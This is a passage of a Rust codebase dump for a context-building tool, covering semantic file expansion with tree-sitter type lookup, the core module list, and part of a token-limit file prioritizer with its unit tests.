Imports: crate::cli::Config, crate::core::cache::FileCache, crate::core::semantic::path_validator::validate_import_path, crate::core::walker::FileInfo, crate::utils::error::ContextCreatorError, std, std::sync::Arc, crate::utils::file_ext::FileType, std::fs, std::collections::HashSet, tests, super::*, crate::core::semantic::query_engine::QueryEngine, tree_sitter::Parser, config

Type references: crate::cli::Config.Config, crate::core::cache::FileCache.FileCache, validate_import_path, crate::core::walker::FileInfo.FileInfo, crate::utils::error::ContextCreatorError.ContextCreatorError, std.Path, std.Path, std.PathBuf, std.PathBuf, std.PathBuf, crate::core::walker::FileInfo.FileInfo, crate::cli::Config.Config, crate::cli::Config.Config, crate::core::cache::FileCache.FileCache, std.PathBuf, crate::core::walker::FileInfo.FileInfo, crate::utils::error::ContextCreatorError.ContextCreatorError, ExpansionReason, std.PathBuf, std.PathBuf, std.Path, std.Path, crate::core::walker::FileInfo.FileInfo, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::file_ext::FileType.FileType, fs, crate::core::walker::FileInfo.FileInfo, std.Path, std.Path, std.Path, std.Path, std.PathBuf, std.PathBuf, std.Path, std.Path, std.Path, std.Path, std.Path, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, std.PathBuf, std.PathBuf, crate::core::walker::FileInfo.FileInfo, std.PathBuf, std.PathBuf, crate::utils::file_ext::FileType.FileType, crate::core::walker::FileInfo.FileInfo, crate::cli::Config.Config, _, crate::core::semantic::query_engine::QueryEngine.QueryEngine, tree_sitter::Parser.Parser

```rust
//! File expansion logic for semantic analysis features
//!
//! This module handles expanding the file list based on semantic relationships
//! discovered during analysis (imports, type references, function calls).

use crate::cli::Config;
use crate::core::cache::FileCache;
use crate::core::semantic::path_validator::validate_import_path;
use crate::core::walker::FileInfo;
use crate::utils::error::ContextCreatorError;
use std::collections::{HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// Detect the project root directory using git root or fallback methods
fn detect_project_root(start_path: &Path) -> PathBuf {
    // First try to find git root
    let mut current = start_path;
    loop {
        if current.join(".git").exists() {
            return current.to_path_buf();
        }
        if let Some(parent) = current.parent() {
            current = parent;
        } else {
            break;
        }
    }

    // Fallback: Look for common project markers
    current = start_path;
    loop {
        // Check for Rust project markers
        if current.join("Cargo.toml").exists() {
            return current.to_path_buf();
        }
        // Check for Node.js project markers
        if current.join("package.json").exists() {
            return current.to_path_buf();
        }
        // Check for Python project markers
        if current.join("pyproject.toml").exists() || current.join("setup.py").exists() {
            return current.to_path_buf();
        }
        // Check for generic project markers
        if current.join("README.md").exists() || current.join("readme.md").exists() {
            return current.to_path_buf();
        }

        if let Some(parent) = current.parent() {
            current = parent;
        } else {
            break;
        }
    }

    // Ultimate fallback: use the start path itself
    start_path.to_path_buf()
}

/// Expand file list based on semantic relationships
///
/// This function takes the initial set of files and expands it to include
/// files that define types, export functions, or are imported by the initial files.
pub fn expand_file_list(
    mut files_map: HashMap<PathBuf, FileInfo>,
    config: &Config,
    cache: &Arc<FileCache>,
) -> Result<HashMap<PathBuf, FileInfo>, ContextCreatorError> {
    // If no semantic features are enabled, return as-is
    if !config.trace_imports && !config.include_callers && !config.include_types {
        return Ok(files_map);
    }

    // Detect the project root for secure path validation
    let project_root = if let Some((first_path, _)) = files_map.iter().next() {
        detect_project_root(first_path)
    } else {
        // If no files, use current directory
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    };

    // Create work queue and visited set for BFS traversal
    let mut work_queue = VecDeque::new();
    let mut visited_paths = HashSet::new();
    let mut files_to_add = Vec::new();

    // Initialize with files that have semantic relationships
    for (path, file_info) in &files_map {
        visited_paths.insert(path.clone());

        // Queue files based on enabled features (depth 0 for initial files)
        if config.include_types && !file_info.type_references.is_empty() {
            work_queue.push_back((path.clone(), file_info.clone(), ExpansionReason::Types, 0));
        }
        if config.trace_imports && !file_info.imports.is_empty() {
            work_queue.push_back((path.clone(), file_info.clone(), ExpansionReason::Imports, 0));
        }
        if config.include_callers && !file_info.function_calls.is_empty() {
            work_queue.push_back((path.clone(), file_info.clone(), ExpansionReason::Callers, 0));
        }
    }

    // Process work queue
    while let Some((source_path, source_file, reason, depth)) = work_queue.pop_front() {
        // Check if we've exceeded the semantic depth limit
        if depth >= config.semantic_depth {
            continue;
        }

        match reason {
            ExpansionReason::Types => {
                // Process type references
                for type_ref in &source_file.type_references {
                    // Skip external types
                    if type_ref.is_external {
                        continue;
                    }

                    // If we have a definition path, add it
                    if let Some(ref def_path) = type_ref.definition_path {
                        if !visited_paths.contains(def_path) && def_path.exists() {
                            // Validate the path for security using the project root
                            match validate_import_path(&project_root, def_path) {
                                Ok(validated_path) => {
                                    visited_paths.insert(validated_path.clone());

                                    // Create FileInfo for the definition file
                                    let mut file_info =
                                        create_file_info_for_path(&validated_path, &source_path)?;

                                    // Queue for next depth level if it has type references
                                    if depth + 1 < config.semantic_depth
                                        && !file_info.type_references.is_empty()
                                    {
                                        // We'll need to perform semantic analysis on this file first
                                        // For now, mark it for addition
                                        file_info.imported_by.push(source_path.clone());
                                    }

                                    files_to_add.push((validated_path.clone(), file_info));
                                }
                                Err(_) => {
                                    // Path validation failed, skip this file
                                }
                            }
                        }
                    } else {
                        // Try to find the type definition file
                        if let Some(def_path) = find_type_definition_file(
                            &type_ref.name,
                            type_ref.module.as_deref(),
                            &source_path,
                            cache,
                        ) {
                            if !visited_paths.contains(&def_path) {
                                // Validate the path for security using the project root
                                match validate_import_path(&project_root, &def_path) {
                                    Ok(validated_path) => {
                                        visited_paths.insert(validated_path.clone());

                                        // Create FileInfo for the definition file
                                        let mut file_info = create_file_info_for_path(
                                            &validated_path,
                                            &source_path,
                                        )?;

                                        // Queue for next depth level if it has type references
                                        if depth + 1 < config.semantic_depth
                                            && !file_info.type_references.is_empty()
                                        {
                                            // We'll need to perform semantic analysis on this file first
                                            // For now, mark it for addition
                                            file_info.imported_by.push(source_path.clone());
                                        }

                                        files_to_add.push((validated_path, file_info));
                                    }
                                    Err(_) => {
                                        // Path validation failed, skip this file
                                    }
                                }
                            }
                        }
                    }
                }
            }
            ExpansionReason::Imports => {
                // Process imports - already handled by semantic analysis
                // The imported files should already be in the imported_by relationships
            }
            ExpansionReason::Callers => {
                // Process function calls - this would require finding files that define the called functions
                // For now, this is a placeholder for future enhancement
            }
        }
    }

    // Add new files to the map
    for (path, file_info) in files_to_add {
        files_map.insert(path, file_info);
    }

    // Update imported_by relationships for proper prioritization
    update_import_relationships(&mut files_map);

    Ok(files_map)
}

/// Reason for expanding to include a file
#[derive(Debug, Clone, Copy)]
enum ExpansionReason {
    Types,
    Imports,
    Callers,
}

/// Create a basic FileInfo for a newly discovered file
fn create_file_info_for_path(
    path: &PathBuf,
    source_path: &Path,
) -> Result<FileInfo, ContextCreatorError> {
    use crate::utils::file_ext::FileType;
    use std::fs;

    let metadata = fs::metadata(path)?;
    let file_type = FileType::from_path(path);

    // Calculate relative path from common ancestor
    let relative_path = path
        .strip_prefix(common_ancestor(path, source_path))
        .unwrap_or(path)
        .to_path_buf();

    Ok(FileInfo {
        path: path.clone(),
        relative_path,
        size: metadata.len(),
        file_type,
        priority: 1.0, // Default priority, will be adjusted by prioritizer
        imports: Vec::new(),
        imported_by: vec![source_path.to_path_buf()], // Track who caused this file to be included
        function_calls: Vec::new(),
        type_references: Vec::new(),
    })
}

/// Find the lowest common ancestor (LCA) of two paths using a proper set-based approach
fn common_ancestor(path1: &Path, path2: &Path) -> PathBuf {
    use std::collections::HashSet;

    // Collect all ancestors of path1 into a set for efficient lookup
    let ancestors1: HashSet<&Path> = path1.ancestors().collect();

    // Find the first ancestor of path2 that is also in ancestors1
    // This will be the lowest common ancestor since ancestors() returns in order from leaf to root
    for ancestor in path2.ancestors() {
        if ancestors1.contains(ancestor) {
            return ancestor.to_path_buf();
        }
    }

    // If no common ancestor found (shouldn't happen in normal filesystem),
    // fallback to appropriate root for the platform
    #[cfg(windows)]
    {
        // On Windows, try to get the root from one of the paths
        if let Some(root) = path1.ancestors().last() {
            root.to_path_buf()
        } else {
            PathBuf::from("C:\\")
        }
    }
    #[cfg(not(windows))]
    {
        PathBuf::from("/")
    }
}

/// Check if a file contains a definition for a given type name using AST parsing.
fn file_contains_definition(path: &Path, content: &str, type_name: &str) -> bool {
    // Determine the language from the file extension.
    let language = match path.extension().and_then(|s| s.to_str()) {
        Some("rs") => Some(tree_sitter_rust::language()),
        Some("py") => Some(tree_sitter_python::language()),
        Some("ts") | Some("tsx") => Some(tree_sitter_typescript::language_typescript()),
        Some("js") | Some("jsx") => Some(tree_sitter_javascript::language()),
        _ => None,
    };

    if let Some(language) = language {
        let mut parser = tree_sitter::Parser::new();
        if parser.set_language(language).is_err() {
            return false;
        }

        if let Some(tree) = parser.parse(content, None) {
            // Language-specific queries for type definitions (without predicates)
            let query_text = match path.extension().and_then(|s| s.to_str()) {
                Some("rs") => {
                    r#"
                    [
                      (struct_item name: (type_identifier) @name)
                      (enum_item name: (type_identifier) @name)
                      (trait_item name: (type_identifier) @name)
                      (type_item name: (type_identifier) @name)
                      (union_item name: (type_identifier) @name)
                    ]
                "#
                }
                Some("py") => {
                    r#"
                    [
                      (class_definition name: (identifier) @name)
                      (function_definition name: (identifier) @name)
                    ]
                "#
                }
                Some("ts") | Some("tsx") => {
                    r#"
                    [
                      (interface_declaration name: (type_identifier) @name)
                      (type_alias_declaration name: (type_identifier) @name)
                      (class_declaration name: (type_identifier) @name)
                      (enum_declaration name: (identifier) @name)
                    ]
                "#
                }
                Some("js") | Some("jsx") => {
                    r#"
                    [
                      (class_declaration name: (identifier) @name)
                      (function_declaration name: (identifier) @name)
                    ]
                "#
                }
                _ => return false,
            };

            if let Ok(query) = tree_sitter::Query::new(language, query_text) {
                let mut cursor = tree_sitter::QueryCursor::new();
                let matches = cursor.matches(&query, tree.root_node(), content.as_bytes());

                // Check each match to see if the captured name matches our target type
                for m in matches {
                    for capture in m.captures {
                        if let Ok(captured_text) = capture.node.utf8_text(content.as_bytes()) {
                            if captured_text == type_name {
                                return true;
                            }
                        }
                    }
                }
                return false;
            }
        }
    }
    false
}

/// Find a type definition file by searching nearby paths
fn find_type_definition_file(
    type_name: &str,
    module_name: Option<&str>,
    source_file: &Path,
    cache: &FileCache,
) -> Option<PathBuf> {
    // Get the directory of the source file
    let source_dir = source_file.parent()?;

    // Also get the project root (go up to find src directory)
    let mut project_root = source_dir;
    while let Some(parent) = project_root.parent() {
        // If we find a Cargo.toml or src directory, the parent is likely the project root
        if parent.join("Cargo.toml").exists() || parent.join("src").exists() {
            project_root = parent;
            break;
        }
        // If current dir is named "src", its parent is likely the project root
        if project_root.file_name() == Some(std::ffi::OsStr::new("src")) {
            project_root = parent;
            break;
        }
        project_root = parent;
    }

    // Convert type name to lowercase for file matching
    let type_name_lower = type_name.to_lowercase();

    // Common patterns for type definition files
    let mut patterns = vec![
        // Direct file name matches
        format!("{type_name_lower}.rs"),
        format!("{type_name_lower}.py"),
        format!("{type_name_lower}.ts"),
        format!("{type_name_lower}.js"),
        format!("{type_name_lower}.tsx"),
        format!("{type_name_lower}.jsx"),
        // Types files
        "types.rs".to_string(),
        "types.py".to_string(),
        "types.ts".to_string(),
        "types.js".to_string(),
        // Module files
        "mod.rs".to_string(),
        "index.ts".to_string(),
        "index.js".to_string(),
        "__init__.py".to_string(),
        // Common type definition patterns
        format!("{type_name_lower}_types.rs"),
        format!("{type_name_lower}_type.rs"),
        format!("{type_name_lower}s.rs"), // plural form
    ];

    // If we have a module name, add module-based patterns
    if let Some(module) = module_name {
        let module_lower = module.to_lowercase();
        patterns.insert(0, format!("{module_lower}.rs"));
        patterns.insert(1, format!("{module_lower}.py"));
        patterns.insert(2, format!("{module_lower}.ts"));
        patterns.insert(3, format!("{module_lower}.js"));
        patterns.insert(4, format!("{module_lower}.tsx"));
        patterns.insert(5, format!("{module_lower}.jsx"));
        patterns.insert(6, format!("{module}.rs")); // Also try original case
        patterns.insert(7, format!("{module}.py"));
        patterns.insert(8, format!("{module}.ts"));
        patterns.insert(9, format!("{module}.js"));
    }

    // Search in current directory first
    for pattern in &patterns {
        let candidate = source_dir.join(pattern);
        if candidate.exists() {
            // Read the file to verify it contains the type definition
            if let Ok(content) = cache.get_or_load(&candidate) {
                // Use AST-based validation to check for type definitions
                if file_contains_definition(&candidate, &content, type_name) {
                    return Some(candidate);
                }
            }
        }
    }

    // Search in parent directory
    if let Some(parent_dir) = source_dir.parent() {
        for pattern in &patterns {
            let candidate = parent_dir.join(pattern);
            if candidate.exists() {
                if let Ok(content) = cache.get_or_load(&candidate) {
                    if file_contains_definition(&candidate, &content, type_name) {
                        return Some(candidate);
                    }
                }
            }
        }
    }

    // Search in common module directories relative to project root
    let search_dirs = vec![
        project_root.to_path_buf(),
        project_root.join("src"),
        project_root.join("src/models"),
        project_root.join("src/types"),
        project_root.join("shared"),
        project_root.join("shared/types"),
        project_root.join("lib"),
        project_root.join("domain"),
        source_dir.join("models"),
        source_dir.join("types"),
    ];

    for search_dir in search_dirs {
        if search_dir.exists() {
            for pattern in &patterns {
                let candidate = search_dir.join(pattern);
                if candidate.exists() {
                    if let Ok(content) = cache.get_or_load(&candidate) {
                        if file_contains_definition(&candidate, &content, type_name) {
                            return Some(candidate);
                        }
                    }
                }
            }
        }
    }

    None
}

/// Update import relationships after expansion
fn update_import_relationships(files_map: &mut HashMap<PathBuf, FileInfo>) {
    // Build a map of which files import which
    let mut import_map: HashMap<PathBuf, Vec<PathBuf>> = HashMap::new();

    for (path, file_info) in files_map.iter() {
        for import_path in &file_info.imports {
            // Track which files import which
            import_map
                .entry(import_path.clone())
                .or_default()
                .push(path.clone());
        }
    }

    // Update imported_by fields
    for (imported_path, importers) in import_map {
        if let Some(file_info) = files_map.get_mut(&imported_path) {
            file_info.imported_by.extend(importers);
            file_info.imported_by.sort();
            file_info.imported_by.dedup();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::utils::file_ext::FileType;

    #[test]
    fn test_no_expansion_when_disabled() {
        let mut files_map = HashMap::new();
        files_map.insert(
            PathBuf::from("test.rs"),
            FileInfo {
                path: PathBuf::from("test.rs"),
                relative_path: PathBuf::from("test.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        );

        let config = Config {
            trace_imports: false,
            include_callers: false,
            include_types: false,
            ..Default::default()
        };

        let cache = Arc::new(FileCache::new());
        let result = expand_file_list(files_map.clone(), &config, &cache).unwrap();

        assert_eq!(result.len(), 1);
    }

    #[test]
    fn test_common_ancestor() {
        #[cfg(windows)]
        {
            let path1 = PathBuf::from("C:\\Users\\user\\project\\src\\main.rs");
            let path2 = PathBuf::from("C:\\Users\\user\\project\\lib\\util.rs");
            let ancestor = common_ancestor(&path1, &path2);
            assert_eq!(ancestor, PathBuf::from("C:\\Users\\user\\project"));

            // Test with same directory
            let path3 = PathBuf::from("C:\\Users\\user\\project\\main.rs");
            let path4 = PathBuf::from("C:\\Users\\user\\project\\util.rs");
            let ancestor2 = common_ancestor(&path3, &path4);
            assert_eq!(ancestor2, PathBuf::from("C:\\Users\\user\\project"));

            // Test with nested paths
            let path5 = PathBuf::from("C:\\Users\\user\\project\\src\\deep\\nested\\file.rs");
            let path6 = PathBuf::from("C:\\Users\\user\\project\\src\\main.rs");
            let ancestor3 = common_ancestor(&path5, &path6);
            assert_eq!(ancestor3, PathBuf::from("C:\\Users\\user\\project\\src"));

            // Test with completely different drives
            let path7 = PathBuf::from("C:\\Program Files\\tool");
            let path8 = PathBuf::from("D:\\Users\\user\\file");
            let ancestor4 = common_ancestor(&path7, &path8);
            // Should fall back to C:\ (root from first path)
            assert_eq!(ancestor4, PathBuf::from("C:\\"));
        }

        #[cfg(not(windows))]
        {
            let path1 = PathBuf::from("/home/user/project/src/main.rs");
            let path2 = PathBuf::from("/home/user/project/lib/util.rs");
            let ancestor = common_ancestor(&path1, &path2);
            assert_eq!(ancestor, PathBuf::from("/home/user/project"));

            // Test with same directory
            let path3 = PathBuf::from("/home/user/project/main.rs");
            let path4 = PathBuf::from("/home/user/project/util.rs");
            let ancestor2 = common_ancestor(&path3, &path4);
            assert_eq!(ancestor2, PathBuf::from("/home/user/project"));

            // Test with nested paths
            let path5 = PathBuf::from("/home/user/project/src/deep/nested/file.rs");
            let path6 = PathBuf::from("/home/user/project/src/main.rs");
            let ancestor3 = common_ancestor(&path5, &path6);
            assert_eq!(ancestor3, PathBuf::from("/home/user/project/src"));

            // Test with completely different top-level directories
            let path7 = PathBuf::from("/usr/local/bin/tool");
            let path8 = PathBuf::from("/home/user/file");
            let ancestor4 = common_ancestor(&path7, &path8);
            assert_eq!(ancestor4, PathBuf::from("/"));

            // Test with one path being an ancestor of the other
            let path9 = PathBuf::from("/home/user/project");
            let path10 = PathBuf::from("/home/user/project/src/main.rs");
            let ancestor5 = common_ancestor(&path9, &path10);
            assert_eq!(ancestor5, PathBuf::from("/home/user/project"));
        }
    }

    #[test]
    fn test_file_contains_definition() {
        // Debug: Test simple tree-sitter parsing first
        let rust_content = r#"
            pub struct MyStruct {
                field1: String,
                field2: i32,
            }
            
            pub enum MyEnum {
                Variant1,
                Variant2(String),
            }
            
            pub trait MyTrait {
                fn method(&self);
            }
        "#;

        let mut parser = tree_sitter::Parser::new();
        parser.set_language(tree_sitter_rust::language()).unwrap();
        let tree = parser.parse(rust_content, None).unwrap();

        // Test simple query without predicate first
        let simple_query = r#"
            [
              (struct_item name: (type_identifier) @name)
              (enum_item name: (type_identifier) @name)
              (trait_item name: (type_identifier) @name)
            ]
        "#;

        let query = tree_sitter::Query::new(tree_sitter_rust::language(), simple_query).unwrap();
        let mut cursor = tree_sitter::QueryCursor::new();
        let matches: Vec<_> = cursor
            .matches(&query, tree.root_node(), rust_content.as_bytes())
            .collect();

        // Should find 3 definitions: MyStruct, MyEnum, MyTrait
        assert_eq!(matches.len(), 3, "Should find exactly 3 type definitions");

        // Test the actual function with a simpler approach
        let rust_path = PathBuf::from("test.rs");
        assert!(file_contains_definition(
            &rust_path,
            rust_content,
            "MyStruct"
        ));
        assert!(file_contains_definition(&rust_path, rust_content, "MyEnum"));
        assert!(file_contains_definition(
            &rust_path,
            rust_content,
            "MyTrait"
        ));
        assert!(!file_contains_definition(
            &rust_path,
            rust_content,
            "NonExistent"
        ));

        // Test Python class definition
        let python_content = r#"
            class MyClass:
                def __init__(self):
                    pass
                    
            def my_function():
                pass
        "#;

        let python_path = PathBuf::from("test.py");
        assert!(file_contains_definition(
            &python_path,
            python_content,
            "MyClass"
        ));
        assert!(file_contains_definition(
            &python_path,
            python_content,
            "my_function"
        ));
        assert!(!file_contains_definition(
            &python_path,
            python_content,
            "NonExistent"
        ));

        // Test TypeScript interface definition
        let typescript_content = r#"
            export interface MyInterface {
                prop1: string;
                prop2: number;
            }
            
            export type MyType = string | number;
            
            export class MyClass {
                constructor() {}
            }
        "#;

        let typescript_path = PathBuf::from("test.ts");
        assert!(file_contains_definition(
            &typescript_path,
            typescript_content,
            "MyInterface"
        ));
        assert!(file_contains_definition(
            &typescript_path,
            typescript_content,
            "MyType"
        ));
        assert!(file_contains_definition(
            &typescript_path,
            typescript_content,
            "MyClass"
        ));
        assert!(!file_contains_definition(
            &typescript_path,
            typescript_content,
            "NonExistent"
        ));
    }

    #[test]
    fn test_query_engine_rust() {
        use crate::core::semantic::query_engine::QueryEngine;
        use tree_sitter::Parser;

        let rust_content = r#"
            use model::{Account, DatabaseFactory, Rule, RuleLevel, RuleName};
            
            pub fn create(
                database: &mut dyn DatabaseFactory,
                account: &Account,
                rule_name: &RuleName,
            ) -> Result<Rule, Box<dyn std::error::Error>> {
                Ok(Rule::new())
            }
        "#;

        let language = tree_sitter_rust::language();
        let query_engine = QueryEngine::new(language, "rust").unwrap();

        let mut parser = Parser::new();
        parser.set_language(tree_sitter_rust::language()).unwrap();

        let result = query_engine
            .analyze_with_parser(&mut parser, rust_content)
            .unwrap();

        println!("Imports found: {:?}", result.imports);
        println!("Type references found: {:?}", result.type_references);

        // Should find imports
        assert!(!result.imports.is_empty(), "Should find imports");

        // Should find type references from the imports
        assert!(
            !result.type_references.is_empty(),
            "Should find type references"
        );

        // Check specific types
        let type_names: Vec<&str> = result
            .type_references
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        assert!(
            type_names.contains(&"DatabaseFactory"),
            "Should find DatabaseFactory type"
        );
        assert!(type_names.contains(&"Account"), "Should find Account type");
        assert!(
            type_names.contains(&"RuleName"),
            "Should find RuleName type"
        );
    }
}
```

## src/core/mod.rs

Imports: cache, context_builder, file_expander, prioritizer, semantic, semantic_graph, token, walker

```rust
//! Core functionality modules

pub mod cache;
pub mod context_builder;
pub mod file_expander;
pub mod prioritizer;
pub mod semantic;
pub mod semantic_graph;
pub mod token;
pub mod walker;
```

## src/core/prioritizer.rs

Imports: crate::core::cache::FileCache, crate::core::context_builder::ContextOptions, crate, crate::core::walker::FileInfo, anyhow::Result, rayon::prelude::*, std::sync::Arc, itertools::Itertools, std::collections::HashMap, tests, super::*, crate::utils::file_ext::FileType, std::fs, std::path::PathBuf, tempfile::TempDir

Type references: crate::core::cache::FileCache.FileCache, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::walker::FileInfo.FileInfo, FileWithTokens, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, FileWithTokens, FileProcessingError, TokenCountingError, FileWithTokens, itertools::Itertools.Itertools, _, _, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, _, crate::core::walker::FileInfo.FileInfo, std::path::PathBuf.PathBuf, crate::utils::file_ext::FileType.FileType, fs, std::path::PathBuf.PathBuf, tempfile::TempDir.TempDir, crate::core::cache::FileCache.FileCache, tempfile::TempDir.TempDir, tempfile::TempDir.TempDir, crate::core::walker::FileInfo.FileInfo, crate::core::context_builder::ContextOptions.ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo

```rust
//! File prioritization based on token limits

use crate::core::cache::FileCache;
use crate::core::context_builder::ContextOptions;
use crate::core::token::{would_exceed_limit, TokenCounter};
use crate::core::walker::FileInfo;
use anyhow::Result;
use rayon::prelude::*;
use std::sync::Arc;

/// File with pre-computed token count
#[derive(Debug, Clone)]
struct FileWithTokens {
    file: FileInfo,
    token_count: usize,
}

/// Prioritize files based on their importance and token limits
pub fn prioritize_files(
    mut files: Vec<FileInfo>,
    options: &ContextOptions,
    cache: Arc<FileCache>,
) -> Result<Vec<FileInfo>> {
    // Adjust priorities based on semantic dependencies
    adjust_priorities_for_dependencies(&mut files);

    // If no token limit, return all files sorted by priority
    let max_tokens = match options.max_tokens {
        Some(limit) => limit,
        None => {
            files.sort_by(|a, b| {
                b.priority
                    .partial_cmp(&a.priority)
                    .unwrap_or(std::cmp::Ordering::Equal)
                    .then_with(|| a.relative_path.cmp(&b.relative_path))
            });
            return Ok(files);
        }
    };

    // Create token counter
    let counter = TokenCounter::new()?;

    // Calculate overhead for markdown structure
    let structure_overhead = calculate_structure_overhead(options, &files)?;

    // Phase 1: Count tokens for all files in parallel with proper error handling
    let results: Vec<crate::utils::error::Result<FileWithTokens>> = files
        .into_par_iter()
        .map(|file| {
            // Read file content from cache
            let content = cache.get_or_load(&file.path).map_err(|e| {
                crate::utils::error::ContextCreatorError::FileProcessingError {
                    path: file.path.display().to_string(),
                    error: format!("Could not read file: {e}"),
                }
            })?;

            // Count tokens for this file
            let file_tokens = counter
                .count_file_tokens(&content, &file.relative_path.to_string_lossy())
                .map_err(
                    |e| crate::utils::error::ContextCreatorError::TokenCountingError {
                        path: file.path.display().to_string(),
                        error: e.to_string(),
                    },
                )?;

            Ok(FileWithTokens {
                file,
                token_count: file_tokens.total_tokens,
            })
        })
        .collect();

    // Use partition_result to separate successes from errors
    use itertools::Itertools;
    let (files_with_tokens, errors): (Vec<_>, Vec<_>) = results.into_iter().partition_result();

    // Log errors without failing the entire operation
    if !errors.is_empty() {
        eprintln!(
            "Warning: {} files could not be processed for token counting:",
            errors.len()
        );
        for error in &errors {
            eprintln!("  {error}");
        }
    }

    // Phase 2: Sort by priority and select files sequentially
    let mut files_with_tokens = files_with_tokens;
    files_with_tokens.sort_by(|a, b| {
        b.file
            .priority
            .partial_cmp(&a.file.priority)
            .unwrap_or(std::cmp::Ordering::Equal)
            .then_with(|| a.file.relative_path.cmp(&b.file.relative_path))
    });

    let mut selected_files = Vec::new();
    let mut total_tokens = structure_overhead;

    // Select files until we hit the token limit
    for file_with_tokens in files_with_tokens {
        // Check if adding this file would exceed the limit
        if would_exceed_limit(total_tokens, file_with_tokens.token_count, max_tokens) {
            // Try to find smaller files that might fit
            continue;
        }

        // Add the file
        total_tokens += file_with_tokens.token_count;
        selected_files.push(file_with_tokens.file);
    }

    // Log statistics
    if options.include_stats {
        eprintln!("Token limit: {max_tokens}");
        eprintln!("Structure overhead: {structure_overhead} tokens");
        eprintln!(
            "Selected {} files with approximately {} tokens",
            selected_files.len(),
            total_tokens
        );
    }

    Ok(selected_files)
}

/// Calculate token overhead for markdown structure
fn calculate_structure_overhead(options: &ContextOptions, files: &[FileInfo]) -> Result<usize> {
    let counter = TokenCounter::new()?;
    let mut overhead = 0;

    // Document header
    if !options.doc_header_template.is_empty() {
        let header = options.doc_header_template.replace("{directory}", ".");
        overhead += counter.count_tokens(&format!("{header}\n\n"))?;
    }

    // Statistics section
    if options.include_stats {
        // Estimate statistics section size
        let stats_estimate = format!(
            "## Statistics\n\n- Total files: {}\n- Total size: X bytes\n\n### Files by type:\n",
            files.len()
        );
        overhead += counter.count_tokens(&stats_estimate)?;
        overhead += 200; // Buffer for file type list
    }

    // File tree
    if options.include_tree {
        overhead += counter.count_tokens("## File Structure\n\n```\n")?;
        // Estimate tree size (rough approximation)
        overhead += files.len() * 20; // ~20 tokens per file in tree
        overhead += counter.count_tokens("```\n\n")?;
    }

    // Table of contents
    if options.include_toc {
        overhead += counter.count_tokens("## Table of Contents\n\n")?;
        for file in files {
            let toc_line = format!("- [{}](#anchor)\n", file.relative_path.display());
            overhead += counter.count_tokens(&toc_line)?;
        }
        overhead += counter.count_tokens("\n")?;
    }

    Ok(overhead)
}

/// Group files by directory for better organization
pub fn group_by_directory(files: Vec<FileInfo>) -> Vec<(String, Vec<FileInfo>)> {
    use std::collections::HashMap;

    let mut groups: HashMap<String, Vec<FileInfo>> = HashMap::new();

    for file in files {
        let dir = file
            .relative_path
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|| ".".to_string());

        groups.entry(dir).or_default().push(file);
    }

    let mut result: Vec<_> = groups.into_iter().collect();
    result.sort_by(|a, b| a.0.cmp(&b.0));

    // Sort files within each group by priority
    for (_, files) in &mut result {
        files.sort_by(|a, b| {
            b.priority
                .partial_cmp(&a.priority)
                .unwrap_or(std::cmp::Ordering::Equal)
                .then_with(|| a.relative_path.cmp(&b.relative_path))
        });
    }

    result
}

/// Adjust file priorities based on semantic dependencies
///
/// Files that are imported by high-priority files get a priority boost.
/// The boost is proportional to the priority of the importing file.
fn adjust_priorities_for_dependencies(files: &mut [FileInfo]) {
    use std::collections::HashMap;

    // Create a map from path to index for quick lookups
    let mut path_to_index: HashMap<std::path::PathBuf, usize> = HashMap::new();
    for (index, file) in files.iter().enumerate() {
        path_to_index.insert(file.path.clone(), index);
    }

    // Calculate priority boosts based on who imports each file
    let mut priority_boosts: Vec<f32> = vec![0.0; files.len()];

    for file in files.iter() {
        // For each file that imports other files
        if !file.imports.is_empty() {
            let importer_priority = file.priority;

            // Give a boost to imported files based on the importer's priority
            for imported_path in &file.imports {
                if let Some(&imported_idx) = path_to_index.get(imported_path) {
                    // Boost is 20% of the importer's priority
                    priority_boosts[imported_idx] += importer_priority * 0.2;
                }
            }
        }
    }

    // Apply the priority boosts
    for (index, boost) in priority_boosts.iter().enumerate() {
        if *boost > 0.0 {
            files[index].priority += boost;
            // Cap maximum priority
            files[index].priority = files[index].priority.min(5.0);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::utils::file_ext::FileType;
    use std::fs;
    use std::path::PathBuf;
    use tempfile::TempDir;

    fn create_test_cache() -> Arc<FileCache> {
        Arc::new(FileCache::new())
    }

    fn create_test_files(_temp_dir: &TempDir, files: &[FileInfo]) {
        for file in files {
            if let Some(parent) = file.path.parent() {
                fs::create_dir_all(parent).ok();
            }
            fs::write(&file.path, "test content").ok();
        }
    }

    #[test]
    fn test_prioritize_without_limit() {
        let temp_dir = TempDir::new().unwrap();
        let files = vec![
            FileInfo {
                path: temp_dir.path().join("low.txt"),
                relative_path: PathBuf::from("low.txt"),
                size: 100,
                file_type: FileType::Text,
                priority: 0.3,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: temp_dir.path().join("high.rs"),
                relative_path: PathBuf::from("high.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        create_test_files(&temp_dir, &files);
        let cache = create_test_cache();
        let options = ContextOptions::default();
